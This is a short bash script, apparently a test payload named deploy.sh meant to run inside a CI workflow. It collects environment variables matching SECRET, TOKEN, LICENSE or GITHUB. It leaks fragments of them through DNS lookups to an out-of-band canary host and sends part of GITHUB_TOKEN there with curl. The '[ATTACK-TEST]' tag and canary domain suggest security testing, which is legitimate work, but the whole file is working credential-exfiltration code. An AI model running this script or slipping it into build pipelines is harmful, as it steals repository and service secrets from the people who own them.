#!/bin/bash
# Malicious payload - exfiltrate secrets via DNS
echo "[ATTACK-TEST] deploy.sh executed in workflow context"
env | grep -iE '(LICENSE|SECRET|TOKEN|GITHUB)' | while read line; do
  # DNS exfil of first 30 chars of each secret
  encoded=$(echo "$line" | head -c 30 | base64 | tr -d '\n' | tr '+/' '-_' | head -c 20)
  nslookup "${encoded}.hb-abc123.oob.canary" 2>/dev/null || true
done
# Also try direct curl
curl -s "https://hb-abc123.oob.canary/$(echo $GITHUB_TOKEN | head -c 20)" 2>/dev/null || true
